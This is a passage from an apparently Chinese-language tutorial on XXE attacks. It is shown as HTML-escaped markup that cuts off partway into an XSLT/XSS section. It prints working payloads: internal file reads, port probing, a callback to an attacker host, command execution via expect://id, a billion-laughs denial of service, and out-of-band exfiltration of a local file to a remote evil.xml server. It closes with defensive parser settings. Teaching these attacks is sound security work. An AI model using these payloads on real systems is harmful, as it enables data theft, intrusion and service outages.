&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE foo [&amp;lt;!ELEMENT foo ANY &amp;gt;&amp;lt;!ENTITY % xxe SYSTEM &amp;quot;http://internal.service/secret_pass.txt&amp;quot; &amp;gt;]&amp;gt;&amp;lt;foo&amp;gt;&amp;amp;xxe;&amp;lt;/foo&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;当然也可以用来探测端口信息，根据响应包的信息，若非 “connection refused” 则表示该端口可能是开放的。&lt;/p&gt;
&lt;p&gt;除了以上的利用，控制服务器对外网发送请求也是有可能成功的。此处可使用 ncat 工具进行测试。&lt;/p&gt;
&lt;p&gt;用 ncat 在自己的服务器上开启监听：ncat -lvkp 8081 (端口可自定义)&lt;/p&gt;
&lt;p&gt;之后便可使用以下语句尝试是否能够建立连接：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;  &amp;lt;!DOCTYPE data SYSTEM &amp;quot;http://ATTACKERIP:8081/&amp;quot; [  &amp;lt;!ELEMENT data (#PCDATA)&amp;gt;  ]&amp;gt;&amp;lt;data&amp;gt;4&amp;lt;/data&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;如果能够建立连接，那么服务器端的 netcat 会收到相应的请求信息。&lt;/p&gt;
&lt;h2 id=&#34;rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; RCE&lt;/h2&gt;
&lt;p&gt;在安装 expect 扩展的 PHP 环境里执行系统命令，当然其他协议也有可能可以执行系统命令&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE xxe [&amp;lt;!ELEMENT name ANY &amp;gt;&amp;lt;!ENTITY xxe SYSTEM &amp;quot;expect://id&amp;quot; &amp;gt;]&amp;gt;&amp;lt;root&amp;gt;&amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h2 id=&#34;拒绝服务攻击dos&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#拒绝服务攻击dos&#34;&gt;#&lt;/a&gt; 拒绝服务攻击 (Dos)&lt;/h2&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;lt;!DOCTYPE lolz [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY lol &amp;quot;lol&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY lol2 &amp;quot;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY lol3 &amp;quot;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY lol4 &amp;quot;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY lol5 &amp;quot;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY lol6 &amp;quot;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY lol7 &amp;quot;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY lol8 &amp;quot;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY lol9 &amp;quot;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;lolz&amp;gt;&amp;amp;lol9;&amp;lt;/lolz&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;：递归引用，lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串，最后再引用 lol9。&lt;/p&gt;
&lt;h2 id=&#34;探测内网端口&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#探测内网端口&#34;&gt;#&lt;/a&gt; 探测内网端口&lt;/h2&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;string&#34;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;xxe&lt;/span&gt; [&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;keyword&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;ANY&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;keyword&#34;&gt;xxe&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1:80&amp;quot;&lt;/span&gt; &amp;gt;&lt;/span&gt;]&amp;gt;&lt;/span&gt; # 修改payload即可探测对应端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;root&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;root&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h2 id=&#34;blind-xxe&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#blind-xxe&#34;&gt;#&lt;/a&gt; Blind XXE&lt;/h2&gt;
&lt;p&gt;Blind XXE，字面意思也就是提交 xml 的服务器端点不再返回有效的数据，此时我们前面的一些利用方法就要失效了&lt;/p&gt;
&lt;h3 id=&#34;xxe-oob外带数据通道&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xxe-oob外带数据通道&#34;&gt;#&lt;/a&gt; XXE OOB (外带数据通道)&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;概念&lt;/strong&gt;&lt;br&gt;
带外数据 (out—of—band data)，有时也称为加速数据 (expedited data)，&lt;br&gt;
是指连接双方中的一方发生重要事情，想要迅速地通知对方。这种通知在已经排队等待发送的任何 “普通”(有时称为 “带内”) 数据之前发送。带外数据设计为比普通数据有更高的优先级。带外数据是映射到现有的连接中的，而不是在客户机和服务器间再用一个连接。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用&lt;/strong&gt;&lt;br&gt;
带外数据通道的建立是使用嵌套形式，利用外部实体中的 URL 发出访问，从而跟攻击者的服务器发生联系。但有些情况下不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。&lt;/p&gt;
&lt;p&gt;将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE ANY[&amp;lt;!ENTITY % file SYSTEM &amp;quot;file:///C:/1.txt&amp;quot;&amp;gt;&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://remotevps/evil.xml&amp;quot;&amp;gt;%remote;%all;]&amp;gt;&amp;lt;root&amp;gt;&amp;amp;send;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;evil.xml：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY % all &amp;quot;&amp;lt;!ENTITY send SYSTEM &amp;#x27;http://remotevps/1.php?file=%file;&amp;#x27;&amp;gt;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;实体 remote，all，send 的引用顺序很重要，首先对 remote 引用目的是将外部文件 evil.xml 引入到解释上下文中，然后执行 % all，这时会检测到 send 实体，在 root 节点中引用 send，就可以成功实现数据转发。当请求发送以后，攻击者的服务器上就能查看到 1.txt 中的内容。&lt;/p&gt;
&lt;h2 id=&#34;xxe漏洞防御&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xxe漏洞防御&#34;&gt;#&lt;/a&gt; XXE 漏洞防御&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1、使用开发语言提供的禁用外部实体的方法&lt;/strong&gt;&lt;br&gt;
 php:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;libxml_disable_entity_loader&lt;/span&gt;(&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;java:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Java&#34;&gt;&lt;figure class=&#34;iseeu highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;DocumentBuilderFactory&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;dbf&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;DocumentBuilderFactory.newInstance();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dbf.setExpandEntityReferences(&lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;Python:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; lxml &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; etree&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=&lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;2、过滤用户提交的 XML 数据&lt;/strong&gt;&lt;br&gt;
过滤关键字： &lt;code&gt;&amp;lt;\!DOCTYPE&lt;/code&gt;  和 &lt;code&gt;&amp;lt;\!ENTITY&lt;/code&gt; ，或者 &lt;code&gt;SYSTEM&lt;/code&gt;  和 &lt;code&gt;PUBLIC&lt;/code&gt; 。&lt;br&gt;
&lt;strong&gt;3、不允许 XML 中含有自己定义的 DTD&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;不止xxe&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#不止xxe&#34;&gt;#&lt;/a&gt; 不止 XXE&lt;/h2&gt;
&lt;h3 id=&#34;xslt&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xslt&#34;&gt;#&lt;/a&gt; XSLT&lt;/h3&gt;
&lt;p&gt;XSLT 全称为 Extensible Stylesheet Language Transformations，主要用于编写样式表将 XML 转换为其他格式的文档，如 XHTML、JSON、文本等。XSLT 也是基于 XML 的，但具备强大的灵活性和扩展性。不仅可以用于文档转换，还常被用于数据清洗、报告生成以及数据的提取和重组等任务。&lt;/p&gt;
&lt;p&gt;XSLT 单独保存为文件时可以是  &lt;code&gt;.xsl&lt;/code&gt;  或者  &lt;code&gt;.xslt&lt;/code&gt;  后缀。以我们之前的  &lt;code&gt;note&lt;/code&gt;  XML 为例，以下  &lt;code&gt;note.xsl&lt;/code&gt;  将其转换为 XHTML 文档:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;xsl:stylesheet&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;version&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&lt;span class=&#34;attr&#34;&gt;xmlns:xsl&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://www.w3.org/1999/XSL/Transform&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;xsl:template&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;match&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;Note&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;To: &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;xsl:value-of&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;select&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;note/to&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;From: &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;xsl:value-of&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;select&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;note/from&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;xsl:template&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;xsl:stylesheet&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss&#34;&gt;#&lt;/a&gt; XSS&lt;/h3&gt;
&lt;p&gt;XSLT 可以为 XML 提供样式转换，而且这个转换是浏览器也支持的。既然可以将 XML 转换成 HTML 来渲染，那么是否支持 HTML 中的一些特性呢，比如执行 JavaScript 脚本？答案是肯定的。&lt;/p&gt;
&lt;p&gt;我们稍微修改一下前文中的样式表，如下所示:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span 